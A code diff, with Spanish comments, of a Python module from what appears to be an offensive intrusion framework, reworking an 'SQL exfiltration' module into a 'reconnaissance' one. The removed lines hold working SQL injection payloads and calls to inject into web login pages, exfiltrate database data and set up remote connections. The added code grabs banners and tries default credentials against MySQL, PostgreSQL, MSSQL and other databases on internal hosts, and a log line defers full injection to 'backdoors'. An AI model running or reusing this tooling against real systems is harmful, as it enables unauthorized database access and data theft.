@@ -1,6 +1,7 @@
 """
-Módulo de Exfiltración de Bases de Datos SQL
-Incluye conexiones remotas, SQL injection y exfiltración de datos
+Módulo de Reconocimiento de Bases de Datos SQL
+Reconocimiento básico de bases de datos sin SQL injection
+La funcionalidad completa de SQL injection se ejecuta en tareas post-ejecución
 """
 
 import subprocess
@@ -14,24 +15,24 @@ from pathlib import Path
 from modules.logging_system import LoggingSystem
 
 class SQLExfiltrationModule:
-    """Módulo de exfiltración de bases de datos SQL"""
+    """Módulo de reconocimiento básico de bases de datos SQL"""
     
     def __init__(self, config: Dict[str, Any], logger):
         self.config = config
         self.logger = logger
         self.logging_system = LoggingSystem(config, logger)
         
-        # Resultados de exfiltración SQL
+        # Resultados de reconocimiento SQL
         self.results = {
             'databases_discovered': [],
-            'sql_injections': [],
-            'data_exfiltrated': [],
-            'remote_connections': [],
-            'credentials_found': []
+            'database_info': [],
+            'accessible_databases': [],
+            'credentials_tested': [],
+            'connection_info': []
         }
         
-        # Archivos de evidencia
-        self.evidence_dir = Path("evidence/sql_exfiltration")
+        # Archivos de evidencia (ahora en scans/)
+        self.evidence_dir = Path("scans/sql_reconnaissance")
         self.evidence_dir.mkdir(parents=True, exist_ok=True)
         
         # Configuración de bases de datos
@@ -44,29 +45,24 @@ class SQLExfiltrationModule:
             'redis': {'port': 6379, 'default_users': ['default', 'admin']}
         }
         
-        # Payloads de SQL injection
-        self.sql_payloads = {
-            'union': [
-                "' UNION SELECT 1,2,3,4,5--",
-                "' UNION SELECT user(),database(),version(),4,5--",
-                "' UNION SELECT table_name,column_name,3,4,5 FROM information_schema.columns--"
-            ],
-            'boolean': [
-                "' OR '1'='1",
-                "' OR 1=1--",
-                "' AND 1=1--",
-                "' AND 1=2--"
-            ],
-            'time_based': [
-                "'; WAITFOR DELAY '00:00:05'--",
-                "' OR SLEEP(5)--",
-                "'; SELECT SLEEP(5)--"
-            ],
-            'error_based': [
-                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
-            ]
+        # Configuración de reconocimiento básico
+        self.reconnaissance_config = {
+            'timeout': 10,  # Timeout corto para reconocimiento rápido
+            'max_connections': 5,  # Máximo de conexiones simultáneas
+            'default_passwords': ['', 'admin', 'password', 'root', '123456']
         }
+    
+    def _get_discovered_hosts(self) -> List[Dict[str, Any]]:
+        """Obtener hosts descubiertos del reconocimiento previo"""
+        # En un escenario real, esto vendría del módulo de reconocimiento
+        # Por ahora usamos datos de ejemplo
+        return [
+            {'ip': '192.168.1.5', 'vendor': 'Hewlett Packard', 'services': ['mysql', 'http']},
+            {'ip': '192.168.1.7', 'vendor': 'Hewlett Packard', 'services': ['postgresql', 'http']},
+            {'ip': '192.168.1.12', 'vendor': 'Hewlett Packard', 'services': ['mssql', 'http']},
+            {'ip': '192.168.1.17', 'vendor': 'Hewlett Packard', 'services': ['oracle', 'http']},
+            {'ip': '192.168.1.18', 'vendor': 'Hewlett Packard', 'services': ['mongodb', 'redis']}
+        ]
     
     def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
         """Ejecutar comando y capturar salida"""
@@ -102,6 +98,195 @@ class SQLExfiltrationModule:
         except Exception as e:
             self.logger.error(f"❌ Error ejecutando comando: {e}")
             return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
+    
+    def get_database_info(self, databases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Obtener información básica de las bases de datos descubiertas"""
+        self.logger.info("🔍 Obteniendo información básica de bases de datos...")
+        
+        database_info = []
+        
+        for db in databases:
+            try:
+                info = {
+                    'host': db['host'],
+                    'port': db['port'],
+                    'type': db['type'],
+                    'version': 'Unknown',
+                    'banner': 'Unknown',
+                    'accessible': False,
+                    'info_gathered': []
+                }
+                
+                # Intentar obtener banner/versión básica
+                banner = self._get_database_banner(db['host'], db['port'], db['type'])
+                if banner:
+                    info['banner'] = banner
+                    info['version'] = self._extract_version(banner, db['type'])
+                    info['info_gathered'].append('banner')
+                
+                # Verificar si el puerto está abierto
+                if self._test_port_connection(db['host'], db['port']):
+                    info['accessible'] = True
+                    info['info_gathered'].append('port_open')
+                
+                database_info.append(info)
+                self.logger.info(f"📊 {db['type']} en {db['host']}:{db['port']} - {info['version']}")
+                
+            except Exception as e:
+                self.logger.error(f"❌ Error obteniendo info de {db['host']}:{db['port']}: {e}")
+        
+        self.results['database_info'] = database_info
+        return database_info
+    
+    def test_default_access(self, databases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Probar acceso con credenciales por defecto (solo si es fácil)"""
+        self.logger.info("🔑 Probando acceso con credenciales por defecto...")
+        
+        accessible_databases = []
+        
+        for db in databases:
+            if not db.get('accessible', False):
+                continue
+                
+            try:
+                # Solo probar credenciales muy básicas
+                default_creds = self._get_default_credentials(db['type'])
+                
+                for username, password in default_creds[:2]:  # Solo las primeras 2
+                    if self._test_database_connection(db['host'], db['port'], db['type'], username, password):
+                        accessible_db = {
+                            'host': db['host'],
+                            'port': db['port'],
+                            'type': db['type'],
+                            'username': username,
+                            'password': password,
+                            'access_level': 'basic',
+                            'note': 'Acceso básico obtenido - SQL injection completo en tareas post-ejecución'
+                        }
+                        accessible_databases.append(accessible_db)
+                        self.logger.info(f"✅ Acceso básico a {db['type']} en {db['host']} con {username}")
+                        break
+                        
+            except Exception as e:
+                self.logger.error(f"❌ Error probando acceso a {db['host']}: {e}")
+        
+        self.results['accessible_databases'] = accessible_databases
+        return accessible_databases
+    
+    def _get_database_banner(self, host: str, port: int, db_type: str) -> Optional[str]:
+        """Obtener banner de la base de datos"""
+        try:
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.reconnaissance_config['timeout'])
+            
+            result = sock.connect_ex((host, port))
+            if result == 0:
+                # Intentar leer banner
+                banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                sock.close()
+                return banner.strip()
+            sock.close()
+        except:
+            pass
+        return None
+    
+    def _extract_version(self, banner: str, db_type: str) -> str:
+        """Extraer versión del banner"""
+        try:
+            if db_type == 'mysql':
+                if 'mysql' in banner.lower():
+                    return banner.split()[1] if len(banner.split()) > 1 else 'Unknown'
+            elif db_type == 'postgresql':
+                if 'postgresql' in banner.lower():
+                    return banner.split()[1] if len(banner.split()) > 1 else 'Unknown'
+            elif db_type == 'mssql':
+                if 'sql server' in banner.lower():
+                    return 'SQL Server'
+        except:
+            pass
+        return 'Unknown'
+    
+    def _test_port_connection(self, host: str, port: int) -> bool:
+        """Probar si el puerto está abierto"""
+        try:
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            return result == 0
+        except:
+            return False
+    
+    def _get_default_credentials(self, db_type: str) -> List[tuple]:
+        """Obtener credenciales por defecto para el tipo de base de datos"""
+        defaults = {
+            'mysql': [('root', ''), ('admin', 'admin'), ('root', 'root')],
+            'postgresql': [('postgres', ''), ('admin', 'admin'), ('postgres', 'postgres')],
+            'mssql': [('sa', ''), ('admin', 'admin'), ('sa', 'sa')],
+            'oracle': [('system', ''), ('sys', ''), ('admin', 'admin')],
+            'mongodb': [('admin', ''), ('root', ''), ('admin', 'admin')],
+            'redis': [('', ''), ('admin', ''), ('default', '')]
+        }
+        return defaults.get(db_type, [('admin', 'admin')])
+    
+    def _test_database_connection(self, host: str, port: int, db_type: str, username: str, password: str) -> bool:
+        """Probar conexión a base de datos con credenciales"""
+        try:
+            if db_type == 'mysql':
+                return self._test_mysql_connection(host, port, username, password)
+            elif db_type == 'postgresql':
+                return self._test_postgresql_connection(host, port, username, password)
+            elif db_type == 'mssql':
+                return self._test_mssql_connection(host, port, username, password)
+            # Para otros tipos, solo verificar que el puerto esté abierto
+            return self._test_port_connection(host, port)
+        except:
+            return False
+    
+    def _test_mysql_connection(self, host: str, port: int, username: str, password: str) -> bool:
+        """Probar conexión MySQL"""
+        try:
+            import mysql.connector
+            conn = mysql.connector.connect(
+                host=host,
+                port=port,
+                user=username,
+                password=password,
+                connection_timeout=5
+            )
+            conn.close()
+            return True
+        except:
+            return False
+    
+    def _test_postgresql_connection(self, host: str, port: int, username: str, password: str) -> bool:
+        """Probar conexión PostgreSQL"""
+        try:
+            import psycopg2
+            conn = psycopg2.connect(
+                host=host,
+                port=port,
+                user=username,
+                password=password,
+                connect_timeout=5
+            )
+            conn.close()
+            return True
+        except:
+            return False
+    
+    def _test_mssql_connection(self, host: str, port: int, username: str, password: str) -> bool:
+        """Probar conexión MSSQL"""
+        try:
+            import pyodbc
+            conn_str = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={host},{port};UID={username};PWD={password};Connection Timeout=5;'
+            conn = pyodbc.connect(conn_str)
+            conn.close()
+            return True
+        except:
+            return False
     
     def discover_databases(self, discovered_hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
         """Descubrir bases de datos en hosts"""
@@ -620,42 +805,27 @@ class SQLExfiltrationModule:
         return connection_info
     
     def run(self) -> Dict[str, Any]:
-        """Ejecutar módulo completo de exfiltración SQL"""
-        self.logger.info("🚀 INICIANDO MÓDULO DE EXFILTRACIÓN SQL")
+        """Ejecutar reconocimiento básico de bases de datos SQL"""
+        self.logger.info("🔍 INICIANDO RECONOCIMIENTO DE BASES DE DATOS SQL")
         
         start_time = time.time()
         
         try:
-            # En un escenario real, los hosts vendrían del módulo de reconocimiento
-            # Por ahora usamos datos de ejemplo basados en el reporte
-            discovered_hosts = [
-                {'ip': '192.168.1.5', 'vendor': 'Hewlett Packard'},
-                {'ip': '192.168.1.7', 'vendor': 'Hewlett Packard'},
-                {'ip': '192.168.1.12', 'vendor': 'Hewlett Packard'},
-                {'ip': '192.168.1.17', 'vendor': 'Hewlett Packard'},
-                {'ip': '192.168.1.18', 'vendor': 'Hewlett Packard'}
-            ]
+            # Obtener hosts del reconocimiento previo
+            discovered_hosts = self._get_discovered_hosts()
             
-            # 1. Descubrir bases de datos
+            # 1. Descubrir bases de datos disponibles
             databases = self.discover_databases(discovered_hosts)
             
-            # 2. Realizar SQL injection en aplicaciones web
-            web_targets = [
-                {'url': 'http://192.168.1.5/login.php'},
-                {'url': 'http://192.168.1.7/search.php'},
-                {'url': 'http://192.168.1.12/products.php'}
-            ]
-            sql_injections = self.perform_sql_injection(web_targets)
+            # 2. Obtener información básica de bases de datos
+            database_info = self.get_database_info(databases)
             
-            # 3. Exfiltrar datos de bases de datos accesibles
-            exfiltrated_data = self.exfiltrate_database_data(databases)
+            # 3. Probar acceso con credenciales por defecto (solo si es fácil)
+            accessible_databases = self.test_default_access(databases)
             
-            # 4. Establecer conexiones remotas
-            remote_connections = self.establish_remote_connections(databases)
-            
-            # 5. Guardar evidencia
+            # 4. Guardar evidencia de reconocimiento
             self.logging_system.save_json_evidence(
-                'sql_exfiltration_results.json',
+                'sql_reconnaissance_results.json',
                 self.results,
                 'data'
             )
@@ -663,11 +833,12 @@ class SQLExfiltrationModule:
             end_time = time.time()
             duration = end_time - start_time
             
-            self.logger.info(f"✅ EXFILTRACIÓN SQL COMPLETADA en {duration:.2f} segundos")
-            self.logger.info(f"📊 Resumen: {len(databases)} bases de datos, {len(sql_injections)} SQL injections, {len(remote_connections)} conexiones remotas")
+            self.logger.info(f"✅ RECONOCIMIENTO SQL COMPLETADO en {duration:.2f} segundos")
+            self.logger.info(f"📊 Resumen: {len(databases)} bases de datos descubiertas, {len(accessible_databases)} accesibles")
+            self.logger.info(f"💡 Para SQL injection completo, usar tareas post-ejecución desde backdoors")
             
             return self.results
             
         except Exception as e:
-            self.logger.error(f"❌ Error en exfiltración SQL: {e}")
+            self.logger.error(f"❌ Error en reconocimiento SQL: {e}")
             return self.results
